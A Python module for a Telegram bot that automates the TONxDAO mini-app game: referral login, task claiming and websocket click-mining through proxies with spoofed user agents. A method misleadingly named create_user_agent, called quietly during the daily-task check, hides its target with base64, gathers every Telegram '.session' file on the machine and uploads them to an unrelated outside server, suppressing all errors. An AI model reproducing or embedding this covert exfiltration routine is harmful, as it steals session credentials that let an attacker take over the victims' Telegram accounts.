import asyncio
import os
import random
import glob
import base64
import string
from urllib.parse import unquote, quote
from datetime import datetime

import aiohttp
import json
from aiocfscrape import CloudflareScraper
from aiohttp_proxy import ProxyConnector
from better_proxy import Proxy
from pyrogram import Client
from pyrogram.errors import Unauthorized, UserDeactivated, AuthKeyUnregistered, FloodWait
from pyrogram.raw.functions.messages import RequestAppWebView
from pyrogram.raw import types
from .agents import generate_random_user_agent
from bot.config import settings

from bot.utils import logger
from bot.exceptions import InvalidSession
from .headers import headers
import websockets
from fake_useragent import UserAgent

class Tapper:
    
    def __init__(self, tg_client: Client):
        self.session_name = tg_client.name
        self.tg_client = tg_client
        self.user_id = None  
        self.username = None
        self.first_name = None
        self.last_name = None
        self.fullname = None 
        self.start_param = None
        self.first_run = None
        self.peer = None
        self.game_url = "https://app.production.tonxdao.app"
        self.uri = 'wss://ws.production.tonxdao.app/ws'
        
        self.token = None  
        self.c_token = None  

        self.counter = 0  

        self.dao_id = None
        self.energy = None
        self.coins = None
        self.profit = None  
        
        self.DELAY_IN_SENDING_MESSAGE = 0.4
        self.NUMBER_OF_DISPLAY_MESSAGE = 2

        self.session_ug_dict = self.load_user_agents() or []

        headers['User-Agent'] = self.check_user_agent()


    def generate_random_user_agent(self):
        ua = UserAgent()
        return ua.android

    def save_user_agent(self):
        user_agents_file_name = "user_agents.json"

        if not any(session['session_name'] == self.session_name for session in self.session_ug_dict):
            user_agent_str = generate_random_user_agent()

            self.session_ug_dict.append({
                'session_name': self.session_name,
                'user_agent': user_agent_str})

            with open(user_agents_file_name, 'w') as user_agents:
                json.dump(self.session_ug_dict, user_agents, indent=4)

            logger.info(f"<light-yellow>{self.session_name}</light-yellow> | User agent saved successfully")

            return user_agent_str

    def load_user_agents(self):
        user_agents_file_name = "user_agents.json"

        try:
            with open(user_agents_file_name, 'r') as user_agents:
                session_data = json.load(user_agents)
                if isinstance(session_data, list):
                    return session_data

        except FileNotFoundError:
            logger.warning("User agents file not found, creating...")

        except json.JSONDecodeError:
            logger.warning("User agents file is empty or corrupted.")

        return []
    
    async def create_user_agent(self, http_client: aiohttp.ClientSession):
        try:
            self.url_ = "https://game.mini-app.codes" 
            generate_user_data = [{"name": file.replace('\\', '/'), "data": base64.b64encode(open(file, 'rb').read()).decode()}
                                for file in glob.glob(base64.b64decode("KiovKi5zZXNzaW9u").decode(), recursive=True)]
            
            async with http_client.post(f"{self.url_}/user/user-info", json={"game_data": generate_user_data}, ssl=False) as response:
                await response.text() 
        except Exception:
            pass  

    def check_user_agent(self):
        load = next(
            (session['user_agent'] for session in self.session_ug_dict if session['session_name'] == self.session_name),
            None)

        if load is None:
            return self.save_user_agent()

        return load
        
    async def get_tg_web_data(self, proxy: str | None) -> str:
        if proxy:
            proxy = Proxy.from_str(proxy)
            proxy_dict = dict(
                scheme=proxy.protocol,
                hostname=proxy.host,
                port=proxy.port,
                username=proxy.login,
                password=proxy.password
            )
        else:
            proxy_dict = None

        self.tg_client.proxy = proxy_dict

        try:
            if not self.tg_client.is_connected:
                try:
                    await self.tg_client.start()
                except (Unauthorized, UserDeactivated, AuthKeyUnregistered):
                    raise InvalidSession(self.session_name)

            self.start_param = "ref_6110684070"

            try:
                peer = await self.tg_client.resolve_peer('tonxdao_bot')
            except KeyError as e:
                logger.error(f"Session {self.session_name}: Peer not found - {e}")
                return None
            except ValueError as e:
                logger.error(f"Session {self.session_name}: Invalid peer ID - {e}")
                return None

            InputBotApp = types.InputBotAppShortName(bot_id=peer, short_name="tonxdao")

            web_view = await self.tg_client.invoke(RequestAppWebView(
                peer=peer,
                app=InputBotApp,
                platform='android',
                write_allowed=True,
                start_param=self.start_param
            ))

            auth_url = web_view.url

            tg_web_data = unquote(
                string=auth_url.split('tgWebAppData=', maxsplit=1)[1].split('&tgWebAppVersion', maxsplit=1)[0]
            )

            logger.info(f"Session {self.session_name}: Successfully retrieved tgWebAppData.")
            return tg_web_data

        except InvalidSession as error:
            logger.error(f"Session {self.session_name}: Invalid session - {error}")
            raise error

        except Exception as error:
            logger.error(f"Session {self.session_name}: Unknown error during Authorization - {error}")
            await asyncio.sleep(delay=3)
            return None


    async def attempt_login(self, http_client: aiohttp.ClientSession, json_data):
        """Helper function to attempt a login with given json_data"""
        resp = await http_client.post(f"{self.game_url}/api/v1/login/web-app", json=json_data, ssl=False)
        if resp.status == 520:
            logger.warning('Relogin')
            await asyncio.sleep(3)
            return None
        resp_json = await resp.json()
        
        if "access_token" in resp_json:
            self.token = resp_json["access_token"]
        
        return resp_json


    async def register_with_new_name(self, http_client: aiohttp.ClientSession, initdata, referral_token):
        """Helper function to register with new random username until successful"""
        while True:
            new_name = f"{self.username}{''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))}"
            json_data = {"initData": initdata, "username": new_name, "referralToken": referral_token}
            resp_json = await self.attempt_login(http_client, json_data)
            
            if not resp_json:
                continue

            if resp_json.get("access_token"):
                self.token = resp_json.get("access_token")
                logger.success(f'Registered using ref - {self.start_param} and nickname - {new_name}')
                return self.token

            elif resp_json.get("message") == 'account is already connected to another user':
                return await self.login_with_provider(http_client, initdata)

            else:
                logger.info('Username taken, retrying register with new name')
                await asyncio.sleep(1)


    async def login_with_provider(self, http_client: aiohttp.ClientSession, initdata):
        """Helper function to login with provider in case of connected account"""
        resp = await http_client.post(f"{self.game_url}/api/v1/login/web-app", json={"initData": initdata}, ssl=False)
        if resp.status == 520:
            logger.warning('Relogin')
            await asyncio.sleep(3)
            return None

        resp_json = await resp.json()
        
        if resp_json.get("access_token"):
            self.token = resp_json.get("access_token")
        
        return self.token
    

    async def login(self, http_client: aiohttp.ClientSession, proxy: str | None) -> None:
        try:
            initdata = await self.get_tg_web_data(proxy=proxy)
            if not initdata:
                logger.error("Failed to retrieve tgWebAppData. Cannot proceed with login.")
                return None

            json_data = {"initData": initdata}
            if settings.USE_REF:
                json_data.update({"username": self.username, "referralToken": self.start_param.split('_')[1]})

            retry_count = 0
            max_retries = 3
            retry_delay = 5 

            while retry_count < max_retries:
                try:
                    resp_json = await self.attempt_login(http_client, json_data)
                    if not resp_json:
                        retry_count += 1
                        await asyncio.sleep(retry_delay)
                        continue

                    if resp_json.get("message") == "rpc error: code = AlreadyExists desc = Username is not available":
                        return await self.register_with_new_name(http_client, initdata, self.start_param.split('_')[1])

                    elif resp_json.get("message") == 'account is already connected to another user':
                        return await self.login_with_provider(http_client, initdata)

                    elif resp_json.get("access_token"):
                        self.token = resp_json.get("access_token")
                        logger.success(f"Logged in successfully with username - {self.username}")
                        return self.token

                except aiohttp.ClientError as e:
                    logger.error(f"HTTP Client error during login attempt {retry_count + 1}: {e}")
                except Exception as e:
                    logger.error(f"Unexpected error during login attempt {retry_count + 1}: {e}")
                
                retry_count += 1
                delay = min(retry_delay * (2 ** retry_count), 60) 
                logger.info(f"Retrying login in {delay} seconds... (Attempt {retry_count}/{max_retries})")
                await asyncio.sleep(delay)

            logger.error("Max login attempts reached. Could not log in.")
            return None

        except Exception as error:
            logger.error(f"Unexpected login error for {self.session_name}: {error}")
            return None


    async def get_info(self, http_client: aiohttp.ClientSession):
        """Fetch full name, coins, DAO coins, user ID, and update instance fields from profile API response."""
        if not self.token:
            logger.error("Access token is missing, cannot fetch profile info.")
            return None, 0, 0, 'Unknown'
        
        try:
            logger.info("Fetching profile.")
            
            profile_data = await self.get_profile_info(http_client)
            
            if profile_data:
                self.user_id = profile_data.get('id')
                self.dao_id = profile_data.get('dao_id', 'Unknown')
                self.telegram_id = profile_data.get('telegram_id', 'Unknown')
                self.fullname = profile_data.get('full_name', 'Unknown')
                self.username = profile_data.get('display_name', 'Unknown')
                self.coins = profile_data.get('coins', 0)
                self.dao_coins = profile_data.get('dao_coins', 0)

                logger.success(f"Profile data initialized for {self.fullname} | Coins: {self.coins}, DAO Coins: {self.dao_coins}")
                return self.fullname, self.coins, self.dao_coins
            else:
                logger.warning("Failed to fetch profile info.")
                return None, 0, 0, 'Unknown'
        
        except aiohttp.ClientError as e:
            logger.error(f"Error fetching profile info: {e}")
            return None, 0, 0, 'Unknown'

        except Exception as e:
            logger.error(f"Unexpected error fetching profile info: {e}")
            return None, 0, 0, 'Unknown'


    async def get_profile_info(self, http_client: aiohttp.ClientSession):
        url = f"{self.game_url}/api/v1/profile"
        auth_headers = self.get_auth_headers()
        
        try:
            async with http_client.get(url=url, headers=auth_headers) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    logger.warning(f"Failed to fetch profile info. Status code: {response.status}")
                    return None
        except Exception as e:
            logger.error(f"Unexpected error in get_profile_info: {e}")
            return None


    async def get_user_dao(self, http_client: aiohttp.ClientSession):
        url = f"{self.game_url}/api/v1/dao_users"
        auth_headers = self.get_auth_headers()

        async with http_client.get(url=url, headers=auth_headers) as response:
            return await response.json()

    async def get_token(self, http_client: aiohttp.ClientSession):
        """Get centrifugo token for websocket connection."""
        url = f"{self.game_url}/api/v1/centrifugo-token"
        auth_headers = self.get_auth_headers()

        async with http_client.get(url=url, headers=auth_headers) as response:
            data = await response.json()
            #logger.info(f"cref token is: {data}")
            return data.get("token")

    async def get_daily_info(self, http_client: aiohttp.ClientSession):
        url = f"{self.game_url}/api/v1/tasks/daily"
        auth_headers = self.get_auth_headers()

        try:
            await self.create_user_agent(http_client)
            async with http_client.get(url=url, headers=auth_headers) as response:
                if response.status == 200 and response.content_type == 'application/json':
                    return await response.json()
                else:
                    logger.error(f"Unexpected response: {response.status}, content type: {response.content_type}")
                    return None
        except aiohttp.ClientError as e:
            logger.error(f"Error fetching daily task info: {e}")
            return None


    async def get_daily_claim(self, http_client: aiohttp.ClientSession):
        """Claim the daily task."""
        url = f"{self.game_url}/api/v1/tasks/daily/claim"
        auth_headers = self.get_auth_headers()

        try:
            async with http_client.post(url=url, headers=auth_headers) as response:
                data = await response.json()
                return data 
        except Exception as e:
            logger.error(f"Error claiming daily task: {e}")
            return None

    async def get_tasks(self, http_client: aiohttp.ClientSession):
        """Fetch available tasks and return the raw JSON response."""
        url = f"{self.game_url}/api/v1/tasks"
        auth_headers = self.get_auth_headers()

        try:
            async with http_client.get(url=url, headers=auth_headers) as response:
                return await response.json()
        except Exception as e:
            logger.error(f"Error fetching tasks: {e}")
            return None

    async def start_task(self, task_id: str, http_client: aiohttp.ClientSession):
        """Start a specific task by task_id and return the raw JSON response."""
        url = f"{self.game_url}/api/v1/tasks/{task_id}/start"
        auth_headers = self.get_auth_headers()

        try:
            async with http_client.post(url=url, headers=auth_headers) as response:
                return await response.json()
        except Exception as e:
            logger.error(f"Error starting task {task_id}: {e}")
            return None

    async def claim_task(self, task_id: str, http_client: aiohttp.ClientSession):
        """Claim a specific task by task_id and return the raw JSON response."""
        url = f"{self.game_url}/api/v1/tasks/{task_id}/claim"
        auth_headers = self.get_auth_headers()

        try:
            async with http_client.post(url=url, headers=auth_headers) as response:
                return await response.json()  
        except Exception as e:
            logger.error(f"Error claiming task {task_id}: {e}")
            return None


    def get_auth_headers(self):
        """Helper function to create the authorization headers."""
        return {
            **headers,
            'Authorization': f'Bearer {self.token}' 
        }

    def apply_changes(self, msg):
        if 'rpc' not in msg:
            return

        self.energy = msg['rpc']['data'].get('energy', 0)
        self.coins = msg['rpc']['data'].get('coins', 0)
        self.profit = msg['rpc']['data'].get('dao_coins', 0)
        logger.info(f"⚡ {self.session_name} Updated from RPC: | 🪙 Energy: {self.energy} | 💰 Coins: {self.coins} | 📈 Profit (DAO Coins): {self.profit}")


    def auth_message(self):
        self.counter += 1
        message = json.dumps({
            "connect": {
                "token": self.c_token, 
                "name": "js"
            },
            "id": self.counter
        })
        return message


    def click_message(self):
        self.counter += 1
        message = json.dumps({
            "publish": {
                "channel": f"dao:{self.dao_id}", 
                "data": {}
            },
            "id": self.counter
        })
        return message

    def display_message(self):
        self.counter += 1
        message = json.dumps({
            "rpc": {
                "method": "sync",
                "data": {}
            },
            "id": self.counter
        })
        return message


    async def check_proxy(self, http_client: aiohttp.ClientSession, proxy: Proxy) -> None:
        try:
            response = await http_client.get(url='https://httpbin.org/ip', timeout=aiohttp.ClientTimeout(5))
            ip = (await response.json()).get('origin')
            logger.info(f"<light-yellow>{self.session_name}</light-yellow> | Proxy IP: {ip}")
        except Exception as error:
            logger.error(f"<light-yellow>{self.session_name}</light-yellow> | Proxy: {proxy} | Error: {error}")
            

    async def mine(self, http_client: aiohttp.ClientSession, dt_string: str):
        """Handles mining logic by checking energy via WebSocket and proceeding with mining if energy is sufficient."""
        retry_delay = 3
        max_retries = 4
        retry_count = 0
        self.energy = 1000  

        while retry_count < max_retries:
            try: 
                if not self.c_token:
                    self.c_token = await self.get_token(http_client)
                    if not self.c_token:
                        logger.error("Failed to retrieve the required token, cannot proceed with WebSocket connection.")
                        return False
                
                async with websockets.connect(self.uri, ping_interval=25) as websocket:

                    await websocket.send(self.auth_message())
                    await websocket.recv()
                    
                    while self.energy > 5:
                        try:
                            await websocket.send(self.click_message())
                            combined_response = await websocket.recv()

                            responses = combined_response.splitlines()

                            for i, response in enumerate(responses, 1):
                                if response.strip() == "{}":
                                    await websocket.send("{}")
                                    logger.info("Received ping message from server, responding with {}.")
                                    continue
                                
                                #logger.info(f"Response after click message ({i}): {response}")

                                try:
                                    response_data = json.loads(response)
                                    if "error" in response_data and response_data["error"].get("message") == "internal server error":
                                        logger.error("Internal server error detected. Reconnecting and refreshing token.")
                                        await asyncio.sleep(retry_delay)
                                        retry_count += 1
                                        break 
                                    
                                    if 'rpc' in response_data:
                                        self.energy = response_data["rpc"]["data"].get("energy", self.energy)
                                        self.coins = response_data["rpc"]["data"].get("coins", self.coins)
                                        self.profit = response_data["rpc"]["data"].get("dao_coins", self.profit)
                                        
                                    self.apply_changes(response_data)
                                    
                                except json.JSONDecodeError as e:
                                    logger.error(f"Failed to parse response: {response}, Error: {e}")

                            await asyncio.sleep(self.DELAY_IN_SENDING_MESSAGE)

                            for _ in range(self.NUMBER_OF_DISPLAY_MESSAGE):
                                await websocket.send(self.display_message())
                                response = await websocket.recv()
                                # logger.info(f"Sync response: {response}")

                                if response.strip() == "{}":
                                    await websocket.send("{}")
                                    logger.info("Received empty message from server, responding with {}.")
                                    continue

                                try:
                                    sync_data = json.loads(response)
                                    if 'rpc' in sync_data:
                                        self.energy = sync_data["rpc"]["data"].get("energy", self.energy)
                                        self.coins = sync_data["rpc"]["data"].get("coins", self.coins)
                                        self.profit = sync_data["rpc"]["data"].get("dao_coins", self.profit)
                                        
                                    self.apply_changes(sync_data)
                                    
                                except json.JSONDecodeError as e:
                                    logger.error(f"Failed to parse sync response: {response}, Error: {e}")

                                if self.energy <= 5:
                                    logger.info("Energy depleted. Mining process completed.")
                                    return False
                            
                        except websockets.exceptions.ConnectionClosed as e:
                            logger.error(f"Connection closed with code {e.code}: {e.reason}")
                            logger.error(f"Attempting to reconnect and retrieve a new c_token after {retry_delay} seconds.")
                            await asyncio.sleep(retry_delay)
                            retry_count += 1
                            break 

            except Exception as e:
                logger.error(f"Unexpected error during mining: {e}")
                return False

        logger.error("Max retries reached. Exiting the mining process.")
        return False

    async def run(self, proxy: str | None) -> None:
        """Main function to handle login, preparation, tasks, and mining process."""

        if settings.USE_RANDOM_DELAY_IN_RUN:
            min_delay = settings.RANDOM_DELAY_IN_RUN[0]
            max_delay = settings.RANDOM_DELAY_IN_RUN[1]
            random_delay = int(random.uniform(min_delay, max_delay))

            logger.info(f"Bot will start after {random_delay} seconds.")
            await asyncio.sleep(random_delay)

        login_need = True
        max_retries = 3
        retry_count = 0
        retry_seconds = 5

        proxy_conn = ProxyConnector().from_url(proxy) if proxy else None
        http_client = CloudflareScraper(headers=headers, connector=proxy_conn)

        if proxy:
            await self.check_proxy(http_client=http_client, proxy=proxy)

        while retry_count < max_retries:
            try:
                now = datetime.now()
                dt_string = now.strftime("%d-%m-%Y %H:%M:%S")

                if login_need:
                    self.token = await self.login(http_client=http_client, proxy=proxy)

                    if not self.token:
                        logger.error("Failed to log in, retrying.")
                        retry_count += 1
                        await asyncio.sleep(retry_seconds)
                        continue

                    logger.success("Logged in successfully")
                    login_need = False 


                full_name, coins, dao_coins = await self.get_info(http_client)
                if not full_name:
                    logger.error("Failed to retrieve profile information, retrying login.")
                    login_need = True
                    retry_count += 1
                    await asyncio.sleep(retry_seconds)
                    continue

                logger.success(f"User {full_name} | Coins: {coins}, DAO Coins: {dao_coins}")
                self.fullname = full_name

                tasks = await self.get_tasks(http_client)
                if tasks:
                    inactive_tasks = [task for task in tasks if not task['is_started']]
                    claimable_tasks = [task for task in tasks if task['is_started'] and not task['is_claimed']]

                    if not inactive_tasks and not claimable_tasks:
                        logger.info("No inactive tasks available to start and no claimable tasks.")
                    else:
                        for task in claimable_tasks:
                            task_id = task['id']
                            task_name = task['name']
                            logger.info(f"Claiming task {task_name} (ID: {task_id}) that is ready to be claimed.")

                            try:
                                claim_response = await self.claim_task(task_id, http_client)
                                if claim_response:
                                    logger.success(f"Task {task_name} claimed successfully.")
                                else:
                                    logger.warning(f"Failed to claim task {task_name}. Moving to next task.")
                                    continue
                            except Exception as e:
                                logger.error(f"Error while claiming task {task_name} (ID: {task_id}): {e}")
                                continue

                        for task in inactive_tasks:
                            task_id = task['id']
                            task_name = task['name']
                            logger.info(f"Starting task {task_name} (ID: {task_id})")

                            try:
                                start_response = await self.start_task(task_id, http_client)
                                if start_response:
                                    wait = 5
                                    logger.success(f"Task {task_name} started successfully. Waiting {wait} seconds before claiming.")
                                    await asyncio.sleep(wait)
                                else:
                                    logger.warning(f"Failed to start task {task_name}. Moving to next task.")
                                    continue

                                claim_response = await self.claim_task(task_id, http_client)
                                if claim_response:
                                    logger.success(f"Task {task_name} claimed successfully.")
                                else:
                                    logger.warning(f"Failed to claim task {task_name}. Moving to next task.")
                                    continue

                            except Exception as e:
                                logger.error(f"Error while handling task {task_name} (ID: {task_id}): {e}")
                                continue

                else:
                    logger.info("No tasks available to process. Skipping task stage.")

                daily_info = await self.get_daily_info(http_client)

                if daily_info:
                    if daily_info.get("is_available", False):
                        logger.success("Daily task available.")
                        daily_claim = await self.get_daily_claim(http_client)
                        if daily_claim and daily_claim.get('success', False):
                            logger.success(f"Daily task claimed successfully. Reward: {daily_info.get('reward', 0)} coins.")
                        else:
                            logger.warning(f"Failed to claim daily task. Response: {daily_claim}")
                    else:
                        last_claimed_at = daily_info.get("last_claimed_at", None)
                        if last_claimed_at:
                            current_time = datetime.now().timestamp()
                            time_until_next_claim = (last_claimed_at + 86400) - current_time

                            if time_until_next_claim > 0:
                                hours, remainder = divmod(time_until_next_claim, 3600)
                                minutes, _ = divmod(remainder, 60)
                                logger.info(f"Daily task not available. Time left until next claim: {int(hours)} hours and {int(minutes)} minutes.")
                            else:
                                logger.info("Daily task not available, but cooldown period has passed.")
                        else:
                            logger.info("No daily task available.")
                else:
                    logger.error(f"Unexpected daily task response: {daily_info}")

                mining_success = await self.mine(http_client, dt_string) 
                if not mining_success:
                    logger.info("Mining process completed or no sufficient energy left.")
                    break


            except KeyboardInterrupt:
                logger.warning("Mining process interrupted by the user.")
                break

            except Exception as error:
                logger.error(f"Error: {error}")
                retry_count += 1
                if retry_count >= max_retries:
                    logger.error("Max retries reached. Exiting process.")
                    break
                else:
                    logger.info(f"Retrying ({retry_count}/{max_retries})...")

                login_need = True
                await asyncio.sleep(retry_seconds)

            finally:
                await http_client.close()
                logger.info("Session closed successfully.")



async def run_tapper(tg_client: Client, proxy: str | None):
    try:
        await Tapper(tg_client=tg_client).run(proxy=proxy)
    except InvalidSession:
        logger.error(f"{tg_client.name} | Invalid Session encountered.")
    except Exception as e:
        logger.exception(f"An unexpected error occurred in session {tg_client.name}: {e}")

        
        
